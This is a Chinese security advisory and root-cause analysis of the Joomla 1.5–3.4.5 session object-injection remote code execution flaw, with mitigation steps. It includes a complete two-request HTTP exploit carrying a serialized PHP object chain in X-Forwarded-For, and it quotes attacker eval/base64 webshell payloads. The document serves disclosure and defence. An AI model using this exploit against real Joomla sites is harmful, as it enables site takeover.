# Joomla 对象注入漏洞分析报告

**Author:阿里云安全攻防对抗团队**

近日，Joomla再曝高危0day漏洞，可进行远程命令执行，阿里云云盾昨日已上线相应的拦截规则抵御该漏洞。同时,对云托管客户已经做了电话通知和自动漏洞修复。统计数据显示，截至16日凌晨，已有数百个恶意IP尝试使用该漏洞对阿里云网站发起攻击，云盾已成功拦截上万次攻击请求，其中攻击请求数排名第一的黑客在一小时内尝试入侵超过1000个 Joomla 网站。

根据此次漏洞情况，Joomla 官方已紧急放出了3.4.6版本。joomla用户除了尽快升级至最新版本，也可采用阿里云安全团队给出的更为完善的修复方案，对网站进行加固，详情可参考：0x03漏洞修复。

0x00 漏洞介绍
=========

* * *

昨日，Joomla 安全团队紧急发布了 Joomla 3.4.6 版本，修复了一个高危 0day 漏洞。该漏洞影响了 1.5 到 3.4.5 的所有版本，漏洞利用无须登录，直接在前台即可执行任意PHP代码。

0x01 漏洞利用
=========

* * *

将恶意代码放在 User-Agent 或 X-Forwarded-For 中发送给网站，将网站返回的cookie值带入第二个请求中，即可触发漏洞。或是在第一个请求中指定cookie值，在第二次中带上同样cookie值也能触发漏洞。

请求一：

```
GET / HTTP/1.1
Host: 127.0.0.1
X-Forwarded-For: }__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:37:"phpinfo();JFactory::getConfig();exit;";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}ð
Cookie: 3342514dde143a04dad958b2eb5a748a=pd4nnqlps2suk9r70189jkpdn2

```

请求二：

```
GET / HTTP/1.1
Host: 127.0.0.1
Cookie: 3342514dde143a04dad958b2eb5a748a=pd4nnqlps2suk9r70189jkpdn2

```

如果执行成功，请求二的返回内容中会显示phpinfo()的执行结果。

0x02 漏洞分析
=========

* * *

在`libraries/joomla/session/session.php`文件中，joomla将`HTTP_USER_AGENT`和`HTTP_X_FORWARDED_FOR`直接存入到了session中

```
……
// Record proxy forwarded for in the session in case we need it later
if (isset($_SERVER['HTTP_X_FORWARDED_FOR']))
{
    $this->set('session.client.forwarded',$_SERVER['HTTP_X_FORWARDED_FOR']);
……
// Check for clients browser
if (in_array('fix_browser', $this->_security) && isset($_SERVER['HTTP_USER_AGENT']))
{
        $browser = $this->get('session.client.browser');
        if ($browser === null)
        {
            $this->set('session.client.browser', $_SERVER['HTTP_USER_AGENT']);
        }
}

```

继续跟进joomla对于session的处理方式，在`/libraries/joomla/session/storage.php`内`JSessionStorage`类中，利用`session_set_save_handler`重新实现了 session 存储的read()和write()方法，从php手册中得定义看到，read()、write()方法传进和传出的参数会分别自动进行序列化和反序列化，这一部分的序列化操作由PHP内核完成：

![enter image description here](http://drops.javaweb.org/uploads/images/23f4e76260e66499a2f898f29e838447a4075ca7.jpg)

继续跟入到read()和write()函数，代码位于`libraries/joomla/session/storage`目录中，从所有session存储引擎的实现代码中可以看到，joomla都没有对 session 的value进行安全处理就进行了写入操作。 默认情况下，joomla使用了数据库引擎对 session 进行存储，这也是本漏洞可以成功利用的条件之一，构造exp时候，利用 Mysql 的字符截断特性，最终写入到数据库中一个被破坏的不合法的反序列化对象，当这个对象被执行read()读取时候，因为截断字符的关系， PHP内核（PHP <= 5.6.13）在解析`session.client.forwarded`后面字符串时，由于长度Check不一致，导致`php_var_unserialize`提前退出，返回false，PHP在上一次`php_var_unserialize`失败的时候，会从之前的指针位置继续开始下一轮key-value尝试，在新一轮key-value尝试中，PHP内核将攻击者注入的"|"当成了分隔符，进行key-value解析，进行反序列化导致对象方法被执行。

漏洞的本质原因有两个，一个是php内核的session解析器bug导致的，另一个是mysql数据库的字符截断特性。如果使用的session存储引擎不存在 Mysql 这样的字符截断特性，此漏洞就无法复现。我们测试该漏洞时，将joomla配置文件`configuration.php`中的`$session_handler`配置为none，即使用文件系统存储session，发现漏洞无法成功利用。

0x03漏洞修复
========

* * *

Joomla 官方已经在昨天紧急放出了3.4.6版本。比对代码后发现，官方此次的升级补丁仅仅在`/libraries/joomla/session/session.php`中删掉了将HTTP_USER_AGENT写入SESSION变量中的代码，增加了对 HTTP_X_FORWARDED_FOR 获取到IP的合法性验证，将此次公开的exp中的利用点修复掉了。但官方没有对JSessionStorage 类中处理session的不安全方式进行修复，因此这个修复方式存在被绕过的可能。只要攻击者寻找到新的可控SESSION值的位置，就可用同样的构造方法触发漏洞。

下面给出更为完善的修复方案：

修改 Joomla 根目录`configuration.php`，把`$session_handler`的值改为none，会将session存储引擎设为文件系统。 把 PHP 版本升到到 5.6.13 或更高的版本。

登录Joomla后台把程序升级到 3.4.6 或更高的版本。

0x04 威胁现状
=========

* * *

统计数据显示，截至16日凌晨，已有数百个恶意IP尝试使用该漏洞对阿里云网站发起攻击，云盾已成功拦截上万次攻击请求，其中攻击请求数排名第一的黑客在一小时内尝试入侵超过1000个 Joomla 网站。

对攻击者使用的攻击payload分析，大部分攻击者在第一个请求中都会插入类似`eval(base64_decode($_post[a]))`这样的代码，在第二个请求中尝试向网站根目录写入一句话木马。如果攻击成功，网站将会被攻击者完全控制。也有部分攻击者使用的是网上公开的漏洞检测payload，如`phpinfo();`和`md5(233333);`，这些代码一般不会对网站造成威胁。

相关链接：

```
https://www.joomla.org/announcements/release-news/5641-joomla-3-4-6-released.html
https://blog.sucuri.net/2015/12/remote-command-execution-vulnerability-in-joomla.html 
https://github.com/80vul/phpcodz/blob/master/research/pch-031.md

```~~~~